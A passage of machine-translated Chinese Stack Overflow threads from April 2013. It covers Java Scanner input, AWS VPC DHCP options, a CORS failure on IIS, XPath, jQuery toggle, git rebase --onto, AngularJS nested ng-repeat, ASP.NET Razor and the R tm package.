> 赞同：6
> 
> 时间：2013-04-12T14:34:53.363

`nextInt()`不读取行尾 - 只是下一个整数。如果您想阅读该行的其余部分，您需要调用`nextLine()`after 。`nextInt()`

目前，你还没有这样做，所以最后一个`nextLine()`方法只是读取整数之后的剩余空行，并立即返回一个空字符串，从而导致异常。

在这种情况下，在`nextLine()`这里打电话应该可以解决问题：

```
System.out.print("Enter number of drawer/s: ");
numDrawer=input.nextInt();
input.nextLine(); //Added nextLine() call 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:32:59.143

你只是按回车吗？

```
ans = input.nextLine().charAt(0); 
```

当它是一个空字符串时抛出此错误。你的例外清楚地告诉你这一点。您需要检查“nextLine”是否为空字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:59:41.840

请像下面这样使用，

```
System.out.print("Any more items? (y/n) ");  
input = new Scanner(System.in);  
ans = input.nextLine().charAt(0); 
```

因为 input.nextLine() 返回空字符串，所以当尝试获取第 0 个字符时，它返回 StringIndexOutOfBoundsException 您需要在调用 input.nextLine() 之前获取一个字符串

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T15:16:01.757

清楚地根据documentaion：

`nextLine()`-`Advances this scanner past the current line and returns the input that was skipped. This method returns the rest of the current line, excluding any line separator at the end. The position is set to the beginning of the next line.`

`nextInt()`-`Scans the next token of the input as an int.`

从今以后`ans = input.nextLine()`，您的代码中将返回您`''`并`char(0)`以`StringIndexOutOfBoundsException`.

# amazon-web-services - 在 Amazon AWS 中的一个 VPC 中创建多个域

> ID：15973947
> 
> 赞同：1
> 
> 时间：2013-04-12T14:26:34.337
> 
> 标签：amazon-web-services, amazon-ec2, amazon-vpc

*是否可以在Amazon AWS*中创建的单个 Amazon VPC（虚拟私有云）中创建多个域。?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T16:44:13.353

*domain-name*和*domain-name-servers*是[DHCP 选项集](http://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_DHCP_Options.html)的一部分，单个[VPC](http://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_Subnets.html)一次只能设置一个 DHCP 选项，这在[AWS 管理控制台](http://aws.amazon.com/console/)中可见，例如为[ec2-associate-dhcp-options](http://docs.aws.amazon.com/AWSEC2/latest/CommandLineReference/ApiReference-cmd-AssociateDhcpOptions.html)记录：

> 将选项与 VPC 关联后，您在该 VPC 中启动的任何现有实例和所有新实例都会使用这些选项。[...]

但是，如果您的用例允许，您可以改为创建额外的 VPC - 默认情况下，您可以为每个区域创建 5 个 VPC，请参阅[Amazon VPC 限制](http://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_Appendix_Limits.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:42:41.893

假设您的意思是多个 IP，那么这个问题的答案就[在这里](https://forums.aws.amazon.com/thread.jspa?threadID=64616)。

报价：

> 您现在可以创建一个额外的网络接口（称为弹性网络接口 (ENI)）并将其附加到 VPC 中的任何 Amazon EC2 实例，每个实例总共有两个网络接口。更多信息在这里 [http://aws.typepad.com/aws/2011/12/new-elastic-network-interfaces-in-the-virtual-private-cloud.html](http://aws.typepad.com/aws/2011/12/new-elastic-network-interfaces-in-the-virtual-private-cloud.html)

例如，如果您尝试代理各种 Web 服务，您的问题是一个很好的问题。

# jquery - CORS、IIS——有史以来最奇怪的失败

> ID：15973951
> 
> 赞同：0
> 
> 时间：2013-04-12T14:26:52.877
> 
> 标签：jquery, ajax, apache, iis

我有一个 Microsoft IIS 服务器（通过 TMG 防火墙）。我有 Apache 服务器（不同的位置，没有防火墙）。我的 IIS 服务器提供数据文件（纯文本，实际上是 CSV）。

Apache 服务器提供简单的 HTML 页面，该页面通过`jQuery.ajax()`方法从 IIS 服务器加载数据。或者，`XDomainRequest()`在 IE8 和 9 上。（作为`$.ajax`传输）。

这是包含数据的目录的 web.config：

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <location path=".">
    <system.webServer>
      <httpProtocol>
        <customHeaders>
          <add name="Access-Control-Allow-Origin" value="*" />
          <add name="Access-Control-Allow-Methods" value="GET,POST" />
          <add name="Access-Control-Allow-Headers" value="Content-Type" />
        </customHeaders>
      </httpProtocol>
    </system.webServer>
  </location>
</configuration> 
```

这是测试：

```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>CORS TEST</title>
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
        <script>
            $(function () {
                var h2 = $('h2:first');
                    h3 = $('h3:first');
                h3.text(navigator.userAgent);
                $.ajax({
                    url : '//my.iis.site.net/ajax/data/test.csv',
                    method : 'GET'
                })
                .done(function() {
                   h2.text('WORKS.'); 
                })
                .fail(function() {
                   h2.text('FAILED.'); 
                });
            });
        </script>
    </head>
    <body>
        <h1>CORS TEST:</h1>
        <h2></h2>
        <h3></h3>
    </body>
</html> 
```

我使用所有支持 CORS 的指定浏览器对其进行了测试。还有一些移动的。我不能让它失败。它只是工作，一切都在书上。

在与我们的团队一起测试此配置后，我们发现可以将我们的新站点提供给更广泛的受众。就在那时，一切都崩溃了。

大多数人说它有效。但是相当数量（绝对超过 10%）的人说它不起作用。恐怕超过10%，甚至50%。

这是最坏的情况：2 个人，但几乎（或完全）相同的软件（操作系统、配置、程序、ISP、浏览器）。一个人看到 AJAX 数据，另一个人没有。

相同的操作系统，相同的浏览器（在两台计算机上使用 3 种不同的浏览器进行测试，完全相同的版本和相同的 ISP）。

在某些计算机上，无论如何，CORS 都不起作用！

是的，他们清除了所有浏览器缓存。没有帮助。

浏览器不会在控制台中抛出任何错误，`$.ajax()`方法只是触发`.fail()`方法，而不是`.done()`. 我不知道如何测试它，因为在我的机器上它总是有效的。即使在我所有的移动设备和 GSM 网络上，它也能发挥魅力。即使在相当旧的 Android 版本和相当旧的默认浏览器上。无论如何我不能让它失败，就像有些人不能让它在他们的任何计算机或移动设备上运行一样。

这是什么邪恶的魔法？我应该忘记 CORS 并切换到 JSONP 传输吗？

我不使用 JSONP 是有原因的。数据服务器将收到巨大的流量。数据每 500 毫秒更新一次，并且会经常被成千上万的用户重新加载（即使以 500 毫秒的速率）。在我的 IIS 服务器上对每个请求执行脚本并不是最好的主意。它可能对性能产生相当负面的影响。

有什么线索吗？将数据压缩为PNG并通过JS解压缩？:) 这是一个疯狂的黑客。CORS 并不疯狂，但这就是我得到的。

知道我该如何开始测试它吗？也许这是 jQuery 中的一个错误，但我对此表示怀疑。即使请求脚本是从同一个域运行的，无法通过 CORS 访问文件的人也无法访问它们。我不得不删除 web.config 以使 AJAX 在同一个域上工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-09T09:57:24.780

如果将 web.config 文件放在 Web 应用程序的子目录中，则必须将该子目录转换为 IIS 管理器中的应用程序。否则，它会为对该子目录的每个请求提供错误 500。

有人在一台服务器上将其转换为 Web 应用程序，但在另一台服务器上没有。这就是为什么有些用户得到了数据，有些用户得到了错误 500 而不是数据。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2016-11-03T16:14:05.410

确保您的客户端不在代理服务器或防火墙后面。某些代理服务器或防火墙可能会阻止或自动响应预检选项请求。

同样在您的服务器 web.config 文件的处理程序部分添加

```
<handlers>
      <remove name="OPTIONSVerbHandler" />
      <remove name="ExtensionlessUrlHandler-Integrated-4.0" />
      <add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="*" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" />
</handlers> 
```

# xpath - Xpath：如何返回空值

> ID：15973959
> 
> 赞同：1
> 
> 时间：2013-04-12T14:27:10.310
> 
> 标签：xpath

我有一个 Xpath，如下所示：

```
"//<path to some table>/*/td[1]/text()" 
```

它返回所有非空 td 的文本值，例如：

```
<text1>, <text2>, <text3> 
```

但问题是在节点之间，包含提到的值可能是一些空的 tds 元素：我想要的是获得包含一些标识符的结果，即存在那些空值，例如：

```
<text1>,<>, <>, <text2>, <text3>, <> 
```

或者

```
<text1>,<null>, <null>, <text2>, <text3>, <null> 
```

我尝试使用下一个：

```
"//<path to some table>/*/string(td[1]/text())" 
```

但它返回*未定义*

当然，我可以获取整个节点，然后在我的代码中使用它（删除所有不必要的信息），但可能有更好的方法吗？

该案例的 html 示例：

```
<html>
<body>
<table class="tablesorter">
<tbody>     
    <tr class="tr_class">
                    <td>text1</td>
                    <td>{some text}</td>                    

    </tr>

    <tr class="tr_class">
                    <td></td>
                    <td>{some text}</td>   
    </tr>

    <tr class="tr_class">
                    <td>text2</td>
                    <td>{some text}</td>                    
    </tr> 

    <tr class="tr_class">
                    <td>text3</td>
                    <td>{some text}</td>                    
    </tr> 

    <tr class="tr_class">
                    <td></td>
                    <td>{some text}</td>                    
    </tr>   

</tbody>
</table>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:43:14.787

那么只需选择`td`元素，而不是其`text()`子节点。因此，随着路径更改为，`//<path to some table>/*/td[1]`或者`//<path to some table>/*/td`您将获得`td`元素的节点集，无论它们是否为空，然后您可以访问每个节点的字符串内容（使用 XPath（`string(.)`为每个元素节点选择）或主机环境方法例如`textContent`在 W3C DOM 或`text`MSXML DOM 中。）。这样空字符串将被包括在内。

如果您使用 XPath 2.0 或 XQuery，您可以直接选择`//<path to some table>/*/td/string(.)`具有一系列字符串值。但是 XPath 1.0 不支持在最后一步调用函数的方法，在那里您可以选择`td`元素节点，然后在单独的步骤中访问每个节点的字符串值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T16:05:13.640

你的意思是你只想要带有文本的 td[1] 并摆脱没有文本的？如果是这样，您可以使用此 xpath

```
//td[1][string-length(text()) > 1] 
```

# jquery - jQuery toggle() 没有动画但功能完整？

> ID：15973961
> 
> 赞同：4
> 
> 时间：2013-04-12T14:27:12.513
> 
> 标签：jquery

我试图在没有动画的情况下切换元素的可见性，但具有完整的功能，以便我更改启动切换的链接的文本。

```
jQuery('.toggle_tags').click(function(){
    var elem = jQuery(this);
    jQuery('#taglist').toggle({complete: function() {
        if (jQuery(this).is(':visible')) {
            elem.text('(Hide Tags)');
        } else {
            elem.text('(View Tags)');
        }
    },});
    return false;
}); 
```

不幸的是，这仍然会触发动画。如果没有任何参数，切换不会动画，但即使只是通过一个函数或完整的函数详细地传递（如上），我仍然可以获得动画。

有什么建议吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-12T14:30:30.320

不要使用`complete`函数。

没有参数，`.toggle()`将同步操作，这意味着您可以在下一条语句中测试它所做的事情，知道它已经完成了，您可以使用：

```
jQuery('#taglist').toggle();
if (jQuery('#taglist').is(':visible')) {
    elem.text('(Hide Tags)');
} else {
    elem.text('(View Tags)');
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:30:34.550

尝试添加`duration: 0`到选项对象。[文档中的](http://api.jquery.com/toggle/)更多信息

# git - git：修改维护分支并将这些补丁应用到另一个分支的正确合并或变基工作流程是什么？

> ID：15973964
> 
> 赞同：6
> 
> 时间：2013-04-12T14:27:16.590
> 
> 标签：git, git-merge, git-rebase

**目标**：我需要为上游项目的先前版本制作自定义补丁，并且我希望能够将这些补丁应用于更高版本。

**问题**：从维护分支变基到更高版本会与维护分支中未修改的文件产生冲突。

**怀疑**：我正在为我想要完成的事情错误地应用合并或变基。

示例：这是我想要完成的逻辑示例，但要了解标记版本 v1.0 和 v2.0 之间的提交历史可以是数百次之间的提交。

我 fork 具有多个标记版本（v1.0 和 v2.0）的上游存储库，其主提交历史 A 到 D。B 是标记 v1.0 的最后一次提交。C 是标签 v2.0 的最后一次提交。D是持续开发。

```
$ git clone git@server:repo

A<--B(v1.0)<--C(v2.0)<--D Master 
```

我分支了一个较早的发布标签 (v1.0) 以进行一些自定义修改，如下所示：

```
$ git checkout v1.0 -b v1.1

     E<--G<--H v1.1
    /
A<--B<--C<--D Master
        \
         F v2.1 
```

我现在要做的是分支出更高版本的标签（v2.0）并将我在 v1.1 分支（G' 和 H'）中所做的补丁提交应用到 v2.0 分支。我需要在 v2.0 日志中保留我在 v1.0 中所做的各个提交。

```
 E<--G<--H v1.1
    /
A<--B<--C<--D Master
        \
         F<--G'<--H' v2.1 
```

**问题**：应用这些更改并避免冲突的正确工作流程是什么？我尝试了许多合并和变基的组合（包括 --onto），但都失败了。git rebase 希望默认为 3 路合并并与不相关的文件发生冲突。

```
$ git rebase v2.1 v1.1
Falling back to patching base and 3-way merge
...
Failed to merge in the changes.

$ git checkout v2.1
$ git rebase v1.1
Falling back to patching base and 3-way merge
...
Failed to merge in the changes. 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T18:41:09.700

我建议您编辑您的问题以包含您尝试重新设置 --onto 的确切命令。这应该是您完成您正在尝试的方式的方式，但您可能已经以这种方式运行命令以触发比实际需要更多的变基。

如果你的 rebase 命令重写了`v1.0`和之间的所有内容`v.2.0`，那么如果该历史记录包括通过非快进合并解决的冲突，这可能会导致很多不必要的痛苦。

为了清楚起见，我已将有关合并冲突和变基的解释移至此答案的底部。`rebase --onto`但是，该部分只是推测，查看您尝试的示例会很有帮助。现在没有可用的，我会提供我认为你*应该*做的。话虽如此，让我们开始您的解决方案。

* * *

## 解决方案

* * *

**变基--onto**

我喜欢向后阅读 --onto 的论点以更好地理解。向后阅读，`--onto <1> <2> <3>`读为 - 将任何提交在 上`<3>`，未在 上`<2>`，并将它们应用于`<1>`. 提交不是“移动”的，而是“克隆”的，因此您的旧提交仍然在原处 - rebase --onto 只是创建它们的副本并在`<1>`.

重要的是要知道，在执行 a 之后，`rebase --onto`您最终可能会处于无头状态。如上所述应用新提交，但它们不会立即更改分支的状态。这在该过程中增加了一个额外的步骤，但也为您提供了额外的安全性，即知道变基不会破坏您的分支 - 您将有机会在将这些更改应用于您的分支之前查看更改的历史记录。

从这张图开始。

```
 E<--G<--H v1.1
    /
A<--B<--C<--D Master
        \
         F v2.1 
```

根据您的描述，要获取 only`G`并`H`遵循`F`，*而不*包括，那么您应该尝试以下命令。`E`

```
git rebase --onto F G^ v1.1 
```

如果你的情况，我写了上面的假设尽可能少。

这将立即处理提交`v1.1`中 *存在*`G`的任何提交，并在之后应用它们`F`。由于实际被重写的唯一提交是`G`and `H`，因此没有理由让您遇到与这两个提交更改的内容无关的任何冲突。

* * *

**无头状态**

如上所述，您最终可能会处于无头状态。这意味着您不再在您的分支中。您此时的图表实际上看起来像这样......

```
 E<--G<--H v1.1
    /
A<--B<--C<--D Master
        \
         F v2.1
          \
           G'<--H' (currently checkout out headless state) 
```

如您所见，分支 v2.1 仍位于`F`，但您已经创建了`A<--B<--C<--F<--G'<--H'`. 这是您想要的，但它不在您的`v2.1`分支中。因此，现在查看您的历史记录并确认它是您想要的。如果你愿意，甚至可以测试它。验证后，您只需签出 v2.1 并运行以下命令...

```
git checkout v2.1
git merge H' 
```

这假设您在 v2.1 上没有新的提交，这些提交不在`H'`. 为确保，您可能希望`--ff-only`在合并上使用标志，以便它将拒绝合并而不是创建合并提交。

就像我上面所说的，这是一个需要注意的额外步骤，但因此您可以重置确保`git rebase --onto`不会在您的实际分支上弄得一团糟。如果您发现 rebase 没有按预期工作 - 您可以简单地检查`v2.1`并查看没有造成任何伤害。

* * *

**结果**

在您的快进合并完成后，您将拥有如下所示的历史记录...

```
 E<--G<--H v1.1
    /
A<--B<--C<--D Master
        \
         F<--G'<--H' v2.1 
```

* * *

**Cherry-picking vs Rebase --onto**

不会详细介绍樱桃采摘，但我想明确以下..

```
git checkout v2.1
git cherry-pick G^..H 
```

也完全等价...

```
git rebase --onto v2.1 G^ H
git checkout v2.1
git reset --hard <hash> <-- were hash is the commit the rebase kicks you into. 
```

Cherry pick 的步骤更少，rebase 可以在不检查“base”的情况下完成，在这两种情况下都是`v2.1`. 同样如前所述， rebase --onto 不会直接影响您的分支，如果出现问题，则更容易从中恢复。两者都“克隆”了他们带到基础上的提交，而原件保持不变。

* * *

## 问题

* * *

以上是关于如何实现您要求做的事情的一般解释。以下是我对您为什么遇到您所描述的问题的怀疑。

* * *

**非快进冲突解决和变基**

我的猜测是，在 v1.0 和 v2.0 之间，您有一些用于解决冲突的非快进合并。在非快进合并期间解决冲突时，该冲突的解决方案将存储在*合并提交*中，而不是存储在有问题的提交本身中。合并提交发生在合并点的历史后期，而不是冲突提交本身。

当您变基时，git 会单独执行每个提交并重新提交它 - 结果，您将重温由非快进合并引起的所有冲突，但该冲突的解决方案直到合并发生的历史后期才可用。使用非快进合并解决的冲突不利于您将来重新设置分支的能力，除非您愿意一一重新解决所有这些冲突。

* * *

**你可能犯的错误**

如果我对您的问题的猜测是正确的，那么您可能已经做了以下事情......

```
git rebase --onto v1.1 F v1.1 
```

这个或这个的一些变体将导致获取所有`F`未打开 的提交`v1.1`并将它们附加到`v1.1`. 如上所述，这将导致每次提交之间`B`并被`F`一一重新提交。如果其中存在通过非快进合并解决的冲突 - 那么您将通过这些提交重新体验这些冲突中的每一个作为 rebase 步骤。

* * *

**合并而不是变基**

您的问题标题表明您可能愿意简单地合并这些历史。如果您不关心线性历史，您可能只想将 v1.1 合并到`F`. 这不应该导致任何奇怪的冲突，但它会严重混淆你的历史。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T15:09:04.713

虽然它可能没有 rebase 的细粒度控制或合并的便利性，但将一系列提交传递给`git cherry-pick`似乎更适合在旧分支上进行单独更改并将它们播放到当前分支上。

因此，如果 G 和 H 是最后两个提交，`v1.1`您应该能够通过以下方式挑选它们`v2.0`：

`git cherry-pick v1.1~1`

（或手动提供提交哈希）

如果您已经尝试过，并且有缺点，请告诉我。我仍在尝试自己完善这种工作流程:)

# ios - UIViewController viewDidAppear 关闭后？

> ID：15973968
> 
> 赞同：0
> 
> 时间：2013-04-12T14:27:26.123
> 
> 标签：ios, objective-c, viewcontroller

我有一个使用故事板的应用程序。我正在使用标准 segues 从“主视图控制器”到其他视图控制器，并且我正在使用dismissViewController 解散其他视图控制器。（请注意，它们主要显示在表单中）。

问题是，当它返回主视图控制器时，我需要进行一些清理（清除数组，重新加载 tableview 等等）。既然我不能使用 viewDidLoad 或 viewDidAppear，我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:31:38.933

我认为最好的解决方案是为您呈现的控制器添加块（例如 closeActionBlock），并在您隐藏控制器时调用此块。（您可以在[Xcode 代码完成的 Objective-C 块属性](https://stackoverflow.com/questions/9121466/objective-c-block-property-with-xcode-4-code-completion)中看到它是如何实现的）

# c# - .NET：在没有 AOP 的情况下记录进入/退出？

> ID：15973980
> 
> 赞同：4
> 
> 时间：2013-04-12T14:27:51.443
> 
> 标签：c#, logging, log4net, enterprise-library, nlog

我希望能够在代码执行进入方法然后退出时进行记录，我想知道是否有人对实现此目的的最佳方法有任何评论？

我知道存在一种在运行时注入日志代码的 AOP 方式，但我想拥有更多的控制权，而且 PostSharp 似乎是一个付费框架。

您会在这里推荐什么级别的日志记录，我认为是 DEBUG。

记录时间呢？方法进入vs退出需要多长时间

我很想知道其他人在这里做什么以及您正在使用什么框架。

我正在考虑使用 log4net。

我在考虑记录的是参数和方法的名称以及参数的值，退出时我正在考虑记录我返回的对象的值（如果有的话）..

其他人都在做什么？

提前致谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-12T14:41:41.357

如果您不想使用 PostSharp（尽管有免费版本）或生成运行时代理，可以使用名为[Afterthought](https://github.com/vc3/Afterthought)的静态编织的开源替代方案。

或者，您可以使用其中一种[分析工具](https://stackoverflow.com/questions/3927/what-are-some-good-net-profilers)。VS Ultimate 内置了一个。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-12T15:29:53.187

好吧，您当然可以创建一个“一次性记录器”，它可以“自动”记录您选择的方法的信息：

```
public class EnterExitLogger : IDisposable
{
  Logger logger;
  string name;

  public EnterExitLogger(Logger logger, string name, params object [] args)
  {
    this.logger = logger;
    this.name = name;
    this.logger.Debug("Entering {0}", this.name);
    int i = 0;
    foreach (var a in args)
    {
      this.logger.Debug("arg[{0}] = {1}", i, a);
      i++;
    }
  }

  public void Dispose()
  {
    this.Logger.Debug("Exiting {0}", this.name);
  }
} 
```

然后像这样使用它：

```
public class MyClass
{
  private static readonly Logger logger = LogManager.GetCurrentClassLogger();

  public void SomeMethod(int x, int y)
  {
    using (new EnterExitLogger(logger, "SomeMethod", x, y))
    {
      //Do your work here
    }
  }
} 
```

这对我来说并不是一个特别好的主意，我怀疑我自己会不会这样做。另一方面，它确实在不使用 AOP 的情况下实现了某种形式的 Enter/Exit 日志记录。如果您真的想要“自动”进入/退出日志记录，我不确定如何在没有 AOP 或企业库版本（其名称让我忽略了）的情况下实现它。

显然，在我提出的解决方案中创建和处理 EnterExitLogger 会产生一些开销，但对你来说可能还不够。

# angularjs - 在嵌套的 ng-repeat 指令中使用 ng-model

> ID：15973985
> 
> 赞同：17
> 
> 时间：2013-04-12T14:28:05.133
> 
> 标签：angularjs, angularjs-ng-repeat

我正在尝试在 ng-repeat 指令“内”使用 ng-model，该指令本身嵌套在 ng-repeat 指令中。

以下 jsfiddle 演示了我的问题以及我解决该问题的两次尝试。

[http://jsfiddle.net/rskLy/4/](http://jsfiddle.net/rskLy/4/)

我的控制器定义如下：

```
var mod = angular.module('TestApp', []);
mod.controller('TestCtrl', function ($scope) {        
var machine = {};
machine.noteMatrix = [
    [false, false, false],
    [false, true, false],
    [false, false, false]
];

$scope.machine = machine;

// ...
}); 
```

**1.**

```
<table>
    <thead>
        <tr>
            <th>--</th>
            <th ng-repeat="no in machine.noteMatrix[0]">{{$index+1}}</th>
        </tr>
    </thead>
    <tbody>
        <tr ng-repeat="track in machine.noteMatrix">
            <td>--</td>                
            <td ng-repeat="step in track">                    
                <input type="checkbox" ng-model="track[$index]"> {{step}}
            </td>
        </tr>
    </tbody>
</table> 
```

第一个示例/尝试更新控制器内的 machine.noteMatrix，但每次按下复选框时，angularjs 在 javascript 控制台中显示以下错误两次：

> 不允许在转发器中重复。中继器：步入轨道

有时它也会显示此错误：

> 不允许在转发器中重复。中继器：在 machine.noteMatrix[0] 中没有

**2.**

```
<table>
    <thead>
        <tr>
            <th>--</th>
            <th ng-repeat="no in machine.noteMatrix[0]">{{$index+1}}</th>
        </tr>
    </thead>
    <tbody>
        <tr ng-repeat="track in machine.noteMatrix">
            <td>--</td>                
            <td ng-repeat="step in track">                    
                <input type="checkbox" ng-model="step"> {{step}}
            </td>
        </tr>
    </tbody>
</table> 
```

第二个示例/尝试从 noteMatrix 正确读取数据，并且在选中/取消选中复选框时，javascript 控制台中不会显示任何错误。但是，更改它们的状态不会更新控制器中的 machine.noteMatrix（按“显示矩阵”按钮以查看 jsfiddle 中的矩阵）。

任何人都可以对此有所了解吗？:)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-12T15:19:25.247

对于 Angular 中的人来说，这是一个常见的问题。发生的事情是 ng-repeat 创建了它自己的范围，如果您将值类型数组传递给它（例如布尔数组），更新它们不会更新父范围。您需要将一组引用类型传递给 ng-repeat 并更新它们以使其持久：

[这是一个基于您的小提琴的解决方案](http://jsfiddle.net/rskLy/11/)

```
machine.noteMatrix = [
    [
        { value: false },
        { value: false }, 
        { value: false }
    ],
    [
        { value: false },
        { value: true }, 
        { value: false }
    ],
    [
        { value: false },
        { value: false }, 
        { value: false }
    ]
]; 
```

这很丑，我知道，但替代方案更丑。您需要做一些事情来管理自己的循环并通过 $parent 或 $parent.$parent 对象引用这些值。我不推荐这个。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T14:58:21.823

~~您的第一个解决方案似乎是正确的。~~

~~这似乎是一个错误，在 angularJS 的不稳定分支中引入（您使用的是不稳定的 1.1.4 - 稳定版本 1.0.6，按预期工作）~~

**编辑：**

事实证明这不是一个错误，而是一个新功能 - ngRepeat 指令现在允许定义跟踪函数（将模型的 id 与 DOM 元素相关联），并且不再允许重复这些跟踪变量。请参阅[相应的提交](https://github.com/angular/angular.js/commit/61f2767ce65562257599649d9eaf9da08f321655)、[ngRepeat 上 1.1.4](http://code.angularjs.org/1.1.4/docs/api/ng.directive%3angRepeat)的文档和[更改日志](https://github.com/angular/angular.js/blob/master/CHANGELOG.md#1.1.4)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-07-02T19:42:38.893

您无需更改模型或访问 $parent。缺少的是“按 $index 跟踪”：

```
 <tr ng-repeat="track in machine.noteMatrix">
        <td>--</td>                
        <td ng-repeat="step in track track by $index">                    
            <input type="checkbox" ng-model="track[$index]"> {{step}}
        </td>
    </tr> 
```

[这是你的小提琴。](http://jsfiddle.net/Pfzgp/)

更多信息：[Angular ng-repeat dupes](https://docs.angularjs.org/error/ngRepeat/dupes)

我不确定`track by`问这个问题时是否还存在，所以当时其他答案可能是正确的，但在当前的 Angular 中，这是要走的路。

# asp.net - ASP.NET Razor - 我可以在三元运算符中添加链接吗？

> ID：15973989
> 
> 赞同：3
> 
> 时间：2013-04-12T14:28:10.970
> 
> 标签：asp.net, html, razor

我的 MVC4 视图中有一个三元运算符：

`@(modelrecord.Website == null ? "" : modelrecord.Website.Replace("http://","") )`

这可行，但我想让网站记录一个超链接。这可能吗？

注意：我正在替换“http://”前缀，因为它很难看。

如果我用 Html.Raw 输入实际字符串，尖括号会被转义，我仍然没有得到链接。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:31:33.123

您可能应该使用`DataAnnotations`和`@Html.DispayFor`助手。

```
public class ModelRecord
{
    [DataType(DataType.EmailAddress)]
    public String EmailAddress { get; set; }

    [DataType(DataType.Url)]
    public String Website { get; set; }
} 
```

然后：

```
email me at @Html.DisplayFor(x => x.EmailAddress)
or visit me online at @Html.DisplayFor(x => x.Website) 
```

[`DataTypeAttribute`](http://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.datatypeattribute.aspx)处理诸如 url、电子邮件等之类的东西，并根据它们进行格式化。

如果要自定义所有 Url，可以为其创建[显示模板](http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-3-default-templates.html)：

**~/Views/Shared/DisplayTemplates/Url.cshtml**

```
@model String
@if (!String.IsNullOrEmpty(Model))
{
    <a href="@Model">@Model.Replace("http://", "")</a>
}
else
{
    @:Default text when url is empty.
} 
```

`DisplayTemplates`(like `EditorTemplates`) 是 MVC 使用的基于约定的路径。因此，您可以将模板放置在`Shared`目录中以在整个站点范围内应用此更改，或者您可以将文件夹放置在控制器文件夹之一中以使其仅应用于该控制器（例如`~/Views/Home/Displaytemplates/Url.cshtml`）。此外，`Url`是与`DisplayType`一起使用的预定义模板之一，以及以下内容：

*   网址
*   电子邮件地址
*   隐藏输入
*   html
*   文本

# r - R tm 包。在哪里可以找到 TermDocumentMatrix 组件的详细说明？我, j, v

> ID：15973990
> 
> 赞同：2
> 
> 时间：2013-04-12T14:28:12.497
> 
> 标签：r, tm

例如，这是一个 tdm：

```
str(AssociatedPress)
List of 6
$ i       : int [1:302031] 1 1 1 1 1 1 1 1 1 1 ...

$ j       : int [1:302031] 116 153 218 272 299 302 447 455 548 597 ...
$ v       : int [1:302031] 1 2 1 1 1 1 2 1 1 1 ...
$ nrow    : int 2246
$ ncol    : int 10473
$ dimnames:List of 2
..$ Docs : NULL
..$ Terms: chr [1:10473] "aaron" "abandon" "abandoned" "abandoning" ...
- attr(*, "Weighting")= chr [1:2] "term frequency" "tf"
- attr(*, "class")= chr [1:2] "DocumentTermMatrix" "simple_triplet_matrix" 
```

我一直在试图找到这些列 $i、$j、$v 的描述......非常感谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T15:04:12.343

看看这个： http: [//www.inside-r.org/packages/cran/slam/docs/as.simple_triplet_matrix](http://www.inside-r.org/packages/cran/slam/docs/as.simple_triplet_matrix)

在下面`?TermDocumentMatrix`

我们看：

```
Value

An object of class TermDocumentMatrix or class DocumentTermMatrix
(both inheriting from a simple triplet matrix in package slam)
containing a sparse term-document matrix or document-term matrix. The
attribute Weighting contains the weighting applied to the matrix. 
```

当您单击语句中的链接时，**它们都继承自一个[简单的三元组矩阵](http://www.inside-r.org/packages/cran/slam/docs/as.simple_triplet_matrix)**：

```
Arguments

i, j    
Integer vectors of row and column indices, respectively.

v   
Vector of values. 
```

和...

```
Details
simple_triplet_matrix is a generator for a class of
“lightweight” sparse matrices, “simply” represented by triplets (i,
j, v) of row indices i, column indices j, and values v, respectively.
simple_triplet_zero_matrix and simple_triplet_diag_matrix are
convenience functions for the creation of empty and diagonal
matrices. 
```

# c# - 使用Repeater控件将ID传递给OnClick事件？

> ID：15973991
> 
> 赞同：3
> 
> 时间：2013-04-12T14:28:13.263
> 
> 标签：c#, asp.net, webforms

这是我的屏幕：

![在此处输入图像描述](https://i.stack.imgur.com/dCYuN.jpg)

这是我在中继器中的 ItemTemplate 的代码：

```
<ItemTemplate>
    <div style="float: left; overflow: hidden; display: inline-block; border-style: solid; margin: 5px; background-color: Silver">
        <div style="text-align:center">
            <asp:Label ID="lblImage" runat="server" Text='<%# DataBinder.Eval(Container.DataItem, "image") %>'></asp:Label>
        </div>
        <asp:Image runat="server" ID="image1" Width="250px" Height="250px" ImageUrl='<%# DataBinder.Eval(Container.DataItem, "url") %>' />
        <div style="text-align: center;">
            <asp:Button runat="server" ID="btnNew" Text="New" />
            <asp:Button runat="server" ID="btnOriginal" Text="Original" />
        </div>
    </div> 
```

